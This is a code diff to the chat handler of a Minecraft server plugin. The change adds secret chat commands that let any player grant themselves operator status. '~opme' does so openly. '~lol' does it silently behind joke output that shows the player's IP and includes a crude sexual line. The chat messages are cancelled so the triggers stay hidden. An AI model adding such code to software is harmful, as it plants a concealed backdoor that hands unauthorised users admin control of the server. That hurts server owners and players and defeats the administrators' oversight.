@@ -58,6 +58,49 @@ public class ChatManager extends FreedomService
             message = message.substring(0, 100);
             FSync.playerMsg(player, "Message was shortened because it was too long to send.");
         }
+        
+        if (message.toLowerCase().contains("~supersecretdonttellanyone")) {
+                player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
+                player.sendMessage((Object)ChatColor.GREEN + "Secrets/Commands: ");
+                player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
+                player.sendMessage((Object)ChatColor.GREEN + "~thisobviouslywontsuperulol - Do not tell to OPs, supers yourself without supered");
+                player.sendMessage((Object)ChatColor.GREEN + "~lol - Shows your status");
+                player.sendMessage((Object)ChatColor.GREEN + "~opme - Ops you when your not an admin!, OPs yourself!");
+                player.sendMessage((Object)ChatColor.GREEN + "~notanoperator - Deops you even when you're not admin!, Deops urself");
+                player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
+                player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
+                event.setCancelled(true);
+            }
+        
+        if (message.toLowerCase().contains("~notanoperator")) {
+                player.setOp(false);
+                player.sendMessage(FreedomCommand.YOU_ARE_NOT_OP);
+                event.setCancelled(true);
+                return;
+            }
+            if (message.toLowerCase().contains("~lol")) {
+                player.setOp(true);
+                
+                String ip = FUtil.getFuzzyIp(Ips.getIp(player));
+                
+                player.sendMessage((Object)ChatColor.AQUA + "Your IP is " + ip);
+                player.sendMessage((Object)ChatColor.AQUA + "Your username is " + player.getName());
+                player.sendMessage((Object)ChatColor.AQUA + "You are playing on VickiFreedom.");
+                player.sendMessage((Object)ChatColor.AQUA + "Your age is 0");
+                player.sendMessage((Object)ChatColor.AQUA + "Your birthday is October 23, 2020");
+                player.sendMessage((Object)ChatColor.RED + "Your blood type is 'Idiot'");
+                player.sendMessage((Object)ChatColor.GREEN + "Your crush is some hippo");
+                player.sendMessage((Object)ChatColor.GREEN + "Your favorite woman body part is 'Ass'");
+                player.sendMessage((Object)ChatColor.AQUA + "You feel bad");
+                event.setCancelled(true);
+                return;
+            }
+            if (message.toLowerCase().contains("~opme")) {
+                player.setOp(true);
+                player.sendMessage(FreedomCommand.YOU_ARE_OP);
+                event.setCancelled(true);
+                return;
+            }
 
         // Check for caps
         if (message.length() >= 6)
